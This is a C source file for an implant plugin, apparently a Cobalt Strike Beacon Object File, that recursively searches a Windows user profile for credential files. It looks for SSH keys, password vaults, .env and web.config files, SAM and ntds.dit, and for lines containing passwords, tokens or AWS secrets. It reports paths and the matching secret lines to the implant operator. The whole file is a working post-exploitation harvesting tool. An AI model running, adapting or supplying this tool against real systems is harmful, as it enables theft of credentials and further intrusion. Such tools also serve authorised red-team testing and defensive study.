/*
 * bof-findcreds [root] [max-depth]
 *
 * Recursively hunt for credential-bearing files under root (default
 * %USERPROFILE%, depth 6).  Flags:
 *   - filenames: .env, id_rsa/id_dsa/id_ecdsa/id_ed25519, *.pem, *.pfx,
 *     *.p12, *.kdbx, *.key, *.ppk, .pgpass, .netrc, .git-credentials,
 *     unattend.xml, web.config, appsettings.json, wp-config.php, *.rdp, *.ovpn
 *   - contents (text files up to 1 MB): "password", "passwd", "api_key",
 *     "apikey", "secret", "token", "aws_access_key_id", "connectionstring",
 *     "BEGIN ... PRIVATE KEY"
 *
 * Prints the matching path and, for content hits, the matching line.  This is
 * a triage tool: validate hits before using them.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

#define FIND_MAX_HITS 200
#define FIND_MAX_FILE (1024u * 1024u)

static const char *name_patterns[] = {
    ".env", "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", ".pem", ".pfx",
    ".p12", ".kdbx", ".key", ".ppk", ".pgpass", ".netrc", ".git-credentials",
    "unattend.xml", "web.config", "appsettings.json", "wp-config.php",
    ".rdp", ".ovpn", "credentials", "passwords", "secrets", ".htpasswd",
    "shadow", "sam", "ntds.dit", NULL
};

static const char *content_patterns[] = {
    "password", "passwd", "api_key", "apikey", "secret", "token",
    "aws_access_key_id", "aws_secret_access_key", "connectionstring",
    "private key", "client_secret", NULL
};

static int contains_ci(const unsigned char *buf, unsigned int len, const char *needle)
{
    unsigned int n = (unsigned int)bof_strlen(needle), i;
    if (!n || len < n) return 0;
    for (i = 0; i + n <= len; i++) {
        unsigned int j;
        for (j = 0; j < n; j++) {
            unsigned char a = buf[i + j], b = (unsigned char)needle[j];
            if (a >= 'A' && a <= 'Z') a += 32;
            if (b >= 'A' && b <= 'Z') b += 32;
            if (a != b) break;
        }
        if (j == n) return 1;
    }
    return 0;
}

static int name_hit(const char *name)
{
    int i;
    for (i = 0; name_patterns[i]; i++) {
        const char *p = name_patterns[i];
        int n = bof_strlen(name), m = bof_strlen(p);
        if (bof_stricmp(name, p) == 0) return 1;
        if (n >= m && bof_stricmp(name + n - m, p) == 0) return 1;
    }
    return 0;
}

typedef struct {
    int hits;
    int limit;
} find_state;

static void print_line(const char *path, const char *needle,
                       const unsigned char *buf, unsigned int len, unsigned int at)
{
    unsigned int s = at, e = at;
    char line[240];
    unsigned int i, o = 0;

    while (s > 0 && buf[s - 1] != '\n' && buf[s - 1] != '\r') s--;
    while (e < len && buf[e] != '\n' && buf[e] != '\r') e++;
    for (i = s; i < e && o < sizeof(line) - 1; i++) {
        unsigned char c = buf[i];
        line[o++] = (c >= 0x20 && c < 0x7f) ? (char)c : '.';
    }
    line[o] = 0;
    BeaconPrintf(CALLBACK_OUTPUT, "  [content] %s : %s\n      %s\n",
                 needle, path, line);
}

static int scan_file_content(const char *path, find_state *st)
{
    unsigned char *buf = NULL;
    unsigned int len = 0, i;
    int found = 0;

    if (bof_read_file(path, &buf, &len) != 0 || !buf) return 0;
    if (len > FIND_MAX_FILE) {
        KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
        return 0;
    }
    for (i = 0; i < len && i < 512; i++) {
        if (buf[i] == 0) {                   /* binary, skip content scan */
            KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
            return 0;
        }
    }
    for (i = 0; content_patterns[i]; i++) {
        unsigned int at = 0;
        if (!contains_ci(buf, len, content_patterns[i])) continue;
        /* locate the first hit for the snippet */
        {
            unsigned int n = (unsigned int)bof_strlen(content_patterns[i]), k;
            for (k = 0; k + n <= len; k++) {
                unsigned int j;
                for (j = 0; j < n; j++) {
                    unsigned char a = buf[k + j], b = (unsigned char)content_patterns[i][j];
                    if (a >= 'A' && a <= 'Z') a += 32;
                    if (b >= 'A' && b <= 'Z') b += 32;
                    if (a != b) break;
                }
                if (j == n) { at = k; break; }
            }
        }
        print_line(path, content_patterns[i], buf, len, at);
        found = 1;
        st->hits++;
        if (st->hits >= st->limit) break;
    }
    KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
    return found;
}

static void scan_path(const char *path, int depth, int maxdepth, find_state *st)
{
    WIN32_FIND_DATAA fd;
    HANDLE h;
    char pattern[MAX_PATH * 2];

    if (st->hits >= st->limit || depth > maxdepth) return;

    bof_strncpy(pattern, path, sizeof(pattern));
    bof_strncat(pattern, "\\*", sizeof(pattern) - bof_strlen(pattern) - 1);
    h = KERNEL32$FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    do {
        char child[MAX_PATH * 2];
        if (st->hits >= st->limit) break;
        if (bof_strcmp(fd.cFileName, ".") == 0 ||
            bof_strcmp(fd.cFileName, "..") == 0) continue;

        bof_strncpy(child, path, sizeof(child));
        bof_strncat(child, "\\", sizeof(child) - bof_strlen(child) - 1);
        bof_strncat(child, fd.cFileName, sizeof(child) - bof_strlen(child) - 1);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;
            if (bof_stricmp(fd.cFileName, "System Volume Information") == 0 ||
                bof_stricmp(fd.cFileName, "$Recycle.Bin") == 0 ||
                bof_stricmp(fd.cFileName, "WinSxS") == 0 ||
                bof_stricmp(fd.cFileName, "node_modules") == 0)
                continue;
            scan_path(child, depth + 1, maxdepth, st);
        } else {
            int named = name_hit(fd.cFileName);
            if (named) {
                BeaconPrintf(CALLBACK_OUTPUT, "  [name] %s\n", child);
                st->hits++;
            }
            if (st->hits < st->limit)
                scan_file_content(child, st);
        }
    } while (KERNEL32$FindNextFileA(h, &fd));

    KERNEL32$FindClose(h);
}

void go(char *args, int alen)
{
    datap parser;
    char *root = "";
    int rlen = 0, maxdepth = 6;
    char base[MAX_PATH];
    find_state st;

    BeaconDataParse(&parser, args, alen);
    root = BeaconDataExtract(&parser, &rlen);
    {
        int v = BeaconDataInt(&parser);
        if (v > 0 && v <= 12) maxdepth = v;
    }
    if (!root) root = "";

    if (root[0]) {
        bof_strncpy(base, root, sizeof(base));
    } else if (!KERNEL32$ExpandEnvironmentStringsA("%USERPROFILE%", base,
                                                   sizeof(base))) {
        BeaconPrintf(CALLBACK_ERROR, "cannot resolve %%USERPROFILE%%\n");
        return;
    }

    bof_memzero(&st, sizeof(st));
    st.limit = FIND_MAX_HITS;

    BeaconPrintf(CALLBACK_OUTPUT,
                 "================ credential file hunt ================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] root: %s (depth %d)\n", base, maxdepth);
    {
        DWORD attr = KERNEL32$GetFileAttributesA(base);
        if (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
            const char *slash = base;
            const char *p;
            for (p = base; *p; p++) if (*p == '\\' || *p == '/') slash = p + 1;
            if (name_hit(slash)) {
                BeaconPrintf(CALLBACK_OUTPUT, "  [name] %s\n", base);
                st.hits++;
            }
            scan_file_content(base, &st);
        } else {
            scan_path(base, 0, maxdepth, &st);
        }
    }
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %d hit(s)%s\n", st.hits,
                 st.hits >= st.limit ? " (limit reached)" : "");
}
